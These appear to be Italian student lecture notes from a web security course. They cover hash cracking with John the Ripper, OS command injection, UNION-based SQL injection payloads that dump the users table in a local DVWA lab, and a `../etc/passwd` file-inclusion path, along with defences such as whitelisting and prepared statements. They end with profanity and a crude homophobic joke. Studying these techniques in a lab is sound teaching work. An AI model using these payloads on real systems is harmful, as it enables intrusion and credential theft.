##### PASSARE A LUCA ANCHE QUESTA PARTE CHE È LA FINE DELL'ESERCITAZIONE SU admin.cloud.vdsi
Dopo aver scaricato la repo con git-dumper andiamo a controllare tutti i file .php
- nel file `config.php` abbiamo email e pw di steve, 
	- la pw è hashata
	- usiamo john the ripper de-hashare (non l'abbiamo visto a lezione ma dovremmo saperlo fare)

QUANDO PASSI LA WORDLIST A ROCKYOU È DIVERSO RISPETTO AGLI ALTRI PROGRAMMI -> `--wordlist = 'wordlist'` NON METTERE `-w = 'wordlist'`



### Parte nuova
- INJECTION -> quando un'entità esterna riesce a far eseguire altri comandi o operazioni che inizialmente non erano previste sull'operazione web.
	- abbiamo injection diverse per codici diversi
		- php
		- sql
		- ecc...



- VARIE TIPOLOGIE
	- OS COMMAND INJECTION
		- ESEMPIO DI FUNZIONI
			- C/C++ -> system(); execvp(); ...
			- JAVA -> Runtime.exec(), ...
			- PERL -> system(), exec(), open(), ..
			- PYTHON -> ...
			- PHP -> ...
		Uso anche dei comandi propri del OS che sto bucando
		Se richiede l'input dell'utente posso avere una bella vulnerabilità
		- CONCATENARE COMANDI
			- `|`
			- `;`
			- `||`
			- `&&`
			- `&`
		- Nelle slide c'è un esempio con un'app web che dato un input esegue il ping di un IP che gli diamo noi
			- quindi esegue un comando bash
			- se io inserisco un comando "malevolo" posso sfruttarla
				- Tipo metto sia l'ip sia un comando mio `8.8.8.8 ; id` -> concatenazione di comandi
				- perché l'app farà `ping 8.8.8.8 ; id` -> SBEM PORCACCIODDIO
				- ECCO L'INJECTION
		- Le web app non sono programmate per avere input/output (non posso fare quindi sudo perché potrebbe chiedermi la password) e anche perché generalmente le web app girano con un id non privilegiato (`www-data`)
			- per risolvere il primo problema uso reverse shell
			- per risolvere il secondo faccio priviledge escalation dopo reverse shell
		
		- SOLUZIONI VISTA DIFENSIONE PER EVITARE DI VENIRE ATTACCATI
			- INPUT VALIDATION
				- fai una white list inserendo SOLO ciò che ti va bene che l'utente inserisca
					- nel caso di ping voglio
						- `MAX 3 numeri`, `.`, `MAX 3 numeri`, `.`,  `MAX 3 numeri`, `.`, `MAX 3 numeri`
				- la black list è più pericolosa perché se mi scordo qualcosa sono cazzi
			- PRINCIPIO DI PRIVILEGIO MINIMO
				- dai il minimo privilegio all'attaccante (non c'è il rischio di priviledge escalation qui????)
	
	- SQL INJECTIONS 
		- Ripasso di mysql 
			- il `LIMIT` servirà
			- la `UNION` è la base della SQL injection -> devono avere stesso tipo e stesso numero di colonne per fare la UNION (fa letteralmente l'unione)
			- i commenti sono importanti
			- tautologie sono importanti -> le usi con **OR 1=1**
			- COSA NON SCRITTA SULLE SLIDE -> **contraddizione** -> **AND 0=1**
	
		- TIPI DI ATTACCO
			- in-band -> input e output sullo stesso canale. per esempio su una connessione http
			- out-of-band -> canali differenti per input e output
			- inferential -> se non ho un canale di output
	- REPOSITORY SU GIT -> `payloadallthethings`
	
	- Come capiamo se abbiamo una SQL injection
		- abbiamo creato un docker con i codici del prof e poi siamo andati su http://localhost e abbiamo fatto l'accesso 
			- username -> admin
			- password -> password
		- siamo andati poi su `sql injection`
		- PER CAPIRE SE POSSIAMO AVERE UNA SQL INJECTION dobbiamo innanzitutto rompere la query
			Io tipo ho questo ![[Pasted image 20260429143127.png]] e se metto 1 ottengo questo ![[Pasted image 20260429143150.png]]
			- che tipo di comando viene eseguito dietro? ipoteticamente questo `SELECT ID, Name, Surname FROM tabella WHERE ID = <input_utente>;`
			- Devo cercare di rompere questo comando
				- PROVIAMO QUASI SEMPRE INIZIALMENTE `'`
					- esce questo
					![[Pasted image 20260429143351.png]]
					
				- Proviamo a usare una tautologia per romperlo, scriviamo `1' OR 1=1 -- `
					- metto `'` perché l'1 viene messo in una stringa (così la chiudo)
					- METTI SEMPRE LO SPAZIO DOPO `--` sennò non va
				- SPOILER -> non ci faccio un cazzo da solo
					- POSSO FARE LA UNION TRA QUESTA TABELLA E UN ALTRA
					- devo capire quante colonne ha l'altra riga, vado a tentativi 
						- CON LA UNION SELECT
							- `' UNION SELECT 1 -- ` e mi esce questo
							![[Pasted image 20260429144645.png]]
							- metto 2  `' UNION SELECT 1,2 -- `
							![[Pasted image 20260429144824.png]]
						- FACCIO ORDER BY
							- devo mettere numeri finché non ho un errore
							- `' ORDER BY 2 -- ` -> non ho errori
							- `' ORDER BY 3 -- `
								![[Pasted image 20260429145057.png]]
							- Con quale tabella la unisco? esiste una tabella che possiamo analizzare che ci dice tutte le informazioni di tutte le tabelle presenti nel database -> `information Schema` 
								- `' UNION SELECT SCHEMA_NAME, 2 FROM Information_schema.SCHEMATA -- ` -> VEDO TUTTI I DATABASE
								![[Pasted image 20260429145437.png]]
								- `' UNION SELECT TABLE_NAME, 2 FROM Information_schema.TABLES WHERE TABLE_SCHEMA = 'dvwa' -- ` -> VEDO TUTTE LE TABELLE DI TUTTI I DATABASE
								![[Pasted image 20260429150339.png]]
								- ` UNION SELECT COLUMN_NAME, 2 FROM Information_schema.COLUMNS WHERE TABLE_SCHEMA = 'dvwa' AND  TABLE_NAME = 'users' -- `
								![[Pasted image 20260429150810.png]]
						- se ho una tabella con più di due colonne uso CONCAT()
							- `' UNION SELECT CONCAT(USER_ID, "-", FIRST_NAME, "-", LAST_NAME, "-", USER, "-", PASSWORD, "-", LAST_LOGIN), 2 FROM users -- `
							![[Pasted image 20260429151127.png]]
		- In SQL esiste una funzionalità chiamata `prepared statements` -> una sorta di type check sulla query digitata dall'utente
			- tipo se si accorge che nella query c'è qualcosa che sembra un comando fa l'escape e quindi è tutto più sicuro



### ALTRE SLIDE
Non solo php, lato server oggi si esegue java, python, ec...

2 tipi di attacchi
- al server
- al client -> javascript

WEB APP INJECTION
- obiettivo -> individuare un punto in cui posso immettere dati che non vengono sanitizzati, ed interpretati come codice

- Esempio di tecnologia
	- PHP -> mi permette di inserire codice nel mio file HTML
		- php INCLUDE e EVAL
			- eval gli metto dentro il codice (è una stringa di codice)
		- request parameters
			- `$_GET`
			- `$_POST`
			- `$_COOKIE`
			- `$_REQUEST` -> è l'unione di tutte e tre quelle sopra
		- TIPO DI ATTACCO -> file inclusion
			- accade quando un php include altri php ma riesco ad influenzare COSA includere
				- esiste da quale parte un `include` e posso manipolarlo
				- due tipologie di file inclusion
					- local
					- remote -> è raro perché di default è disabilitato ma non si sa mai
			- se vai sul sito che abbiamo visto prima su kali hai la parte di `file inclusion`
				- una volta che stai li metti nell'url `../../../../../../../../../../../.../../etc/passwd` (quanti te ne pare di `../`)

>[!question]- DOMANDA CHE IL PROF FA ALL'ESAME
>prof scusi se le faccio una domanda che magari devia dal contenuto della lezione che lei sta facendo quest'oggi e in generale dall'intero corso, ma se vengo scopato in culo da 6 omosessuali, quant'è la probabilità che io diventi gay?

